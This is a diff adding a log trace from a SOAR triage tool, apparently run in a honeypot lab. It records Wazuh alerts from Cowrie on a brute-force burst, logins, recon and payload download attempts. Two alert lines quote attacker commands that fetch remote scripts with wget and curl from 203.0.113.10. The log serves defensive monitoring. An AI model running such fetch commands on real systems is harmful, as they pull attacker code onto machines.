@@ -1,0 +1,48 @@
+# soar-triage: enrich -> triage -> ticket trace, driven automatically by wazuh-integratord
+# Live run against the honeypot-siem lab, 2026-08-20. Source 172.19.0.1 (RFC 1918, AbuseIPDB skipped).
+# The ticket step is a no-op here because no GITHUB_TOKEN was set for this capture.
+
+2026-08-20T01:51:57.982528+00:00 [soar-triage] alert received: rule 100104 level 10 - Cowrie: SSH brute-force, 8 or more failed logins from 172.19.0.1 withi
+2026-08-20T01:51:57.982706+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:51:57.982827+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:51:57.982868+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:04.047522+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
+2026-08-20T01:52:04.047650+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:04.047762+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:04.047802+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:04.107307+00:00 [soar-triage] alert received: rule 100105 level 12 - Cowrie: successful login from 172.19.0.1 right after a brute-force bur
+2026-08-20T01:52:04.107428+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:04.107536+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:04.107575+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:04.165735+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:04.165848+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:04.165951+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:04.165991+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:06.229157+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:06.229279+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:06.229389+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:06.229431+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:08.294714+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:08.294834+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:08.294946+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:08.294987+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:08.355742+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:08.355874+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:08.355988+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:08.356029+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:10.420670+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:10.420819+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:10.420932+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:10.421010+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:10.481388+00:00 [soar-triage] alert received: rule 100151 level 12 - Cowrie: recon from 172.19.0.1 after a brute-force burst (100104), like
+2026-08-20T01:52:10.481625+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:10.481830+00:00 [soar-triage] triage: auto-confirmed (priority high); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:10.481918+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:12.544928+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: wget http://203.0.113.10/x.sh
+2026-08-20T01:52:12.545048+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:12.545160+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:12.545200+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
+2026-08-20T01:52:13.611521+00:00 [soar-triage] alert received: rule 100108 level 10 - Cowrie: remote payload download attempt: curl http://203.0.113.10/payl
+2026-08-20T01:52:13.611649+00:00 [soar-triage] enrich: 172.19.0.1 -> private; reputation: private IP, external lookup skipped
+2026-08-20T01:52:13.611775+00:00 [soar-triage] triage: auto-triaged (priority medium); reasoning logged to /var/ossec/logs/soar-triage-decisions.log
+2026-08-20T01:52:13.611816+00:00 [soar-triage] ticket: not filed (no GITHUB_TOKEN set, ticket not filed)
